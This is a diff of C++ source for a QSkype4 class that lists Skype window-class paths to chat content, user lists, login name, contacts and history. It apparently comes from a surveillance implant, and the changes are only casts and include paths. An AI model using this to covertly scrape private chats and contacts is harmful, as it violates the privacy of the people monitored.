@@ -12,46 +12,46 @@ using namespace std;
 #include "QSkype4.h"
 #include "QSkype3.h"
 #include "QSkype2.h"
-#include "..\HM_SafeProcedures.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
 
 // Skype chat tree
 PWCHAR QSkype4::wChatTree[] = {
-	L"TConversationForm.UnicodeClass",
+	(PWCHAR)L"TConversationForm.UnicodeClass",
 	//L"TChromeMenu.UnicodeClass",
-	L"TChatContentControl",
+	(PWCHAR)L"TChatContentControl",
 	0
 };
 
 // Skype userlist
 PWCHAR QSkype4::wChatUserListTree[] = {
-	L"TConversationForm.UnicodeClass",
-	L"TContactProfile",
+	(PWCHAR)L"TConversationForm.UnicodeClass",
+	(PWCHAR)L"TContactProfile",
 	0
 };
 
 // Skype login name
 PWCHAR QSkype4::wLoginTree[] = {
-	L"tSkMainForm.UnicodeClass",
+	(PWCHAR)L"tSkMainForm.UnicodeClass",
 	0
 };
 
 // Skype contacts tree
 PWCHAR QSkype4::wContactTree[] = {
-	L"tSkMainForm.UnicodeClass",
-	L"TPanel",
-	L"TPanel",
-	L"TSkypeTabControl",
-	L"TMainUserList",
+	(PWCHAR)L"tSkMainForm.UnicodeClass",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TSkypeTabControl",
+	(PWCHAR)L"TMainUserList",
 	0
 };
 
 // Skype history list
 PWCHAR QSkype4::wHistoryTree[] = {
-	L"tSkMainForm.UnicodeClass",
-	L"TPanel",
-	L"TPanel",
-	L"TSkypeTabControl",
-	L"THistoryList",
+	(PWCHAR)L"tSkMainForm.UnicodeClass",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TPanel",
+	(PWCHAR)L"TSkypeTabControl",
+	(PWCHAR)L"THistoryList",
 	0
 };
 
@@ -68,7 +68,7 @@ QSkype4::QSkype4(const HWND hw) : QSkype3(hw)
 	if(HM_SafeGetWindowTextW(hw, wTopic, 256))
 		properties.SetId(wTopic);
 	else
-		properties.SetId(L"");
+		properties.SetId((PWCHAR)L"");
 
 	//GrabUserList();
 
@@ -218,7 +218,7 @@ BOOL QSkype4::GrabTopic() {
 	if(HM_SafeGetWindowTextW(properties.GetHandle(), wTitle, 256))
 		return properties.SetId(wTitle);
 	else
-		return properties.SetId(L"");
+		return properties.SetId((PWCHAR)L"");
 }
 
 // Questo metodo va chiamato una sola volta per finestra e prima di
@@ -229,7 +229,7 @@ BOOL QSkype4::GrabUserList() {
 	BOOL bRes;
 
 	if(!IsWindow(ole.GetHandle())){
-		properties.SetUsers(L"");
+		properties.SetUsers((PWCHAR)L"");
 		return FALSE;
 	}
 
